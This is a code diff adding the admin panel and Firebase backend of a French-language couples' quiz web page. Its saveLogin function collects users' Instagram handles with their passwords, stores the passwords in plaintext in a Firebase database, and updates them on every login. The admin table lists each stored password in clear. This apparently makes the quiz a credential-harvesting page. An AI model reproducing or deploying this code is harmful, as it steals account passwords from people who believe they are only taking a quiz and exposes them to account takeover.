+    if(!list.length){tb.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:2rem">Aucun utilisateur.</td></tr>';return;}
+    tb.innerHTML=list.sort((a,b)=>b.lastLogin-a.lastLogin).map(u=>{
+      const age=now-u.lastLogin;
+      const badge=age<d7?'<span class="badge b-active">Actif</span>':age<d30?'<span class="badge b-new">Récent</span>':'<span class="badge b-idle">Inactif</span>';
+      return '<tr><td style="font-weight:600;color:var(--pink)">'+(u.handle||u.k)+'</td>'
+        +'<td style="font-family:monospace;color:var(--muted);font-size:.82rem">'+(u.password||'—')+'</td>'
+        +'<td style="font-size:.8rem;color:var(--muted)">'+fmtDate(u.joined)+'</td>'
+        +'<td style="font-size:.8rem;color:var(--muted)">'+fmtDate(u.lastLogin)+'</td>'
+        +'<td style="font-family:\'Syne\',sans-serif;font-weight:700;color:var(--blue)">'+(u.loginCount||1)+'</td>'
+        +'<td>'+badge+'</td></tr>';
+    }).join('');
+  });
+}
+function loadAdminSessions(){
+  if(!window._fb){setTimeout(loadAdminSessions,500);return;}
+  window._fb.getSessions((data)=>{
+    const list=data?Object.entries(data).map(([k,v])=>({k,...v})):[];
+    const done=list.filter(s=>s.completedAt);
+    const waiting=list.filter(s=>!s.completedAt&&(s.answers1||s.answers2));
+    const scores=done.map(s=>s.score).filter(Boolean);
+    const avg=scores.length?Math.round(scores.reduce((a,b)=>a+b,0)/scores.length):null;
+    document.getElementById('ss-total').textContent=list.length;
+    document.getElementById('ss-done').textContent=done.length;
+    document.getElementById('ss-wait').textContent=waiting.length;
+    document.getElementById('ss-avg').textContent=avg!==null?avg+'%':'—';
+    const el=document.getElementById('ss-list');
+    if(!list.length){el.innerHTML='<p style="color:var(--muted)">Aucune session.</p>';return;}
+    el.innerHTML=list.sort((a,b)=>b.createdAt-a.createdAt).map(s=>{
+      const status=s.completedAt?'✅ Terminé':s.answers1||s.answers2?'⏳ En attente':'⌛ Non démarré';
+      const scoreHtml=s.score?'<div class="s-score'+(s.score<50?' low':'')+'">'+s.score+'%</div>':'<div style="color:var(--muted)">—</div>';
+      return '<div class="s-card"><div><div class="s-code">'+s.k+'</div>'
+        +'<div style="font-size:.88rem;margin:.2rem 0">'+s.name1+' 💜 '+s.name2+'</div>'
+        +'<div style="font-size:.75rem;color:var(--muted)">'+status+' · '+fmtDate(s.createdAt)+'</div></div>'+scoreHtml+'</div>';
+    }).join('');
+  });
+}
+</script>
+
+<!-- FIREBASE MODULE -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";
+
+const app = initializeApp({
+  apiKey: "AIzaSyBo3zsikjmOtPbaDdzu_U4ASYHaFmoj1xs",
+  authDomain: "my-quiz-4b94a.firebaseapp.com",
+  databaseURL: "https://my-quiz-4b94a-default-rtdb.firebaseio.com",
+  projectId: "my-quiz-4b94a",
+  storageBucket: "my-quiz-4b94a.firebasestorage.app",
+  messagingSenderId: "120835722626",
+  appId: "1:120835722626:web:f96b7eff160a1f066ad39b"
+});
+const db = getDatabase(app);
+
+window._fb = {
+  saveLogin: async (insta, pass) => {
+    const h = (insta.startsWith('@')?insta.slice(1):insta).replace(/[^a-zA-Z0-9_]/g,'_');
+    const r = ref(db,'users/'+h);
+    const now = Date.now();
+    try {
+      const snap = await get(r);
+      if(snap.exists()) await update(r,{lastLogin:now,loginCount:(snap.val().loginCount||0)+1,password:pass});
+      else await set(r,{handle:'@'+(insta.startsWith('@')?insta.slice(1):insta),password:pass,joined:now,lastLogin:now,loginCount:1});
+    } catch(e){ console.warn('saveLogin error:',e); }
+  },
+
+  createSession: async (n1, n2, onOk, onErr) => {
+    const chars='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+    let code, tries=0;
+    while(tries<30){
+      code=Array.from({length:4},()=>chars[Math.floor(Math.random()*chars.length)]).join('');
+      try{ const s=await get(ref(db,'sessions/'+code)); if(!s.exists()) break; }catch(e){}
+      tries++;
+    }
+    try {
+      await set(ref(db,'sessions/'+code),{name1:n1,name2:n2,answers1:null,answers2:null,score:null,createdAt:Date.now(),completedAt:null});
+      onOk(code);
+    } catch(e){ onErr(e.message); }
+  },
+
+  getSession: async (code, onOk, onErr) => {
+    try {
+      const snap = await get(ref(db,'sessions/'+code));
+      onOk(snap.exists()?snap.val():null);
+    } catch(e){ onErr(e.message); }
+  },
+
+  saveAnswers: async (code, field, answers, onOk, onErr) => {
+    try {
+      const d={}; d[field]=answers;
+      await update(ref(db,'sessions/'+code),d);
+      onOk();
+    } catch(e){ onErr(e.message); }
+  },
+
+  listen: (code, onChange) => {
+    return onValue(ref(db,'sessions/'+code), snap=>{ if(snap.exists()) onChange(snap.val()); });
+  },
+
+  setScore: async (code, score) => {
+    try { await update(ref(db,'sessions/'+code),{score,completedAt:Date.now()}); } catch(e){}
+  },
+
+  getUsers: async (cb) => {
+    try { const s=await get(ref(db,'users')); cb(s.exists()?s.val():null); } catch(e){ cb(null); }
+  },
+
+  getSessions: async (cb) => {
+    try { const s=await get(ref(db,'sessions')); cb(s.exists()?s.val():null); } catch(e){ cb(null); }
+  }
+};
+
+console.log('✅ Firebase prêt !');
+</script>
+</body>
+</html>
